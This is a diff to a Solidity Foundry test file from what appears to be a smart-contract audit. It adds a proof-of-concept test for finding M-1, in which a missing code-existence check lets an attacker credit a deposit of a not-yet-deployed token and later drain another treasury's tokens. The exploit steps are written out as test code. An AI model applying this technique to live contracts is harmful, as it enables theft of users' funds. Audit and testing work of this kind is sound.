@@ -260,4 +260,36 @@ contract LeashAuditTest is Test, Deployers {
         emit log_named_decimal_uint("bond to the treasury", leash.owed(address(this), currency1), 18);
         assertTrue(e.clean, "an always-in-range manager was breached");
     }
+
+    // ================================================================ M-1
+
+    /// M-1. solmate's SafeTransferLib doesn't check for code, so `_pull` of a token that isn't deployed yet succeeds
+    /// without moving anything and the mandate is credited. With the opening price exactly on the initial range's lower
+    /// tick, the position needs none of currency1, so the mandate is created. Once the token is deployed at its
+    /// predictable (CREATE2 / bridge-factory) address and another treasury deposits it, the attacker closes and walks
+    /// away with that treasury's tokens; the victim's own close then reverts.
+    function test_M1_phantomDepositOfUndeployedTokenDrainsOtherMandates() public {
+        address phantom = address(type(uint160).max - 0x1234); // sorts above currency0; no code yet
+        PoolKey memory a = PoolKey(currency0, Currency.wrap(phantom), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, key.hooks);
+        vm.prank(eve);
+        leash.createMandate(a, SQRT_PRICE_1_1, _terms(), 100e18, 50e18, Position(0, 600, 1_000e18));
+        assertEq(leash.mandate(a.toId()).idle1, 50e18, "credited 50 tokens it never received");
+
+        // The real token appears at that address; an honest treasury deposits it in its own mandate.
+        MockERC20 real = new MockERC20("P", "P", 18);
+        vm.etch(phantom, address(real).code);
+        MockERC20(phantom).mint(address(this), 100e18);
+        MockERC20(phantom).approve(address(leash), type(uint256).max);
+        PoolKey memory b = PoolKey(currency0, Currency.wrap(phantom), LPFeeLibrary.DYNAMIC_FEE_FLAG, 10, key.hooks);
+        leash.createMandate(b, SQRT_PRICE_1_1, _terms(), 100e18, 100e18, Position(-600, 600, 1_000e18));
+
+        vm.warp(auctionEnd);
+        vm.prank(eve);
+        leash.close(a); // no bids: the attacker's treasury closes and is paid its "inventory"
+        emit log_named_decimal_uint("victim tokens taken by the attacker", MockERC20(phantom).balanceOf(eve), 18);
+
+        vm.expectRevert(); // the victim's ledger is now unbacked
+        leash.close(b);
+        assertEq(MockERC20(phantom).balanceOf(eve), 0, "attacker took another mandate's tokens");
+    }
 }
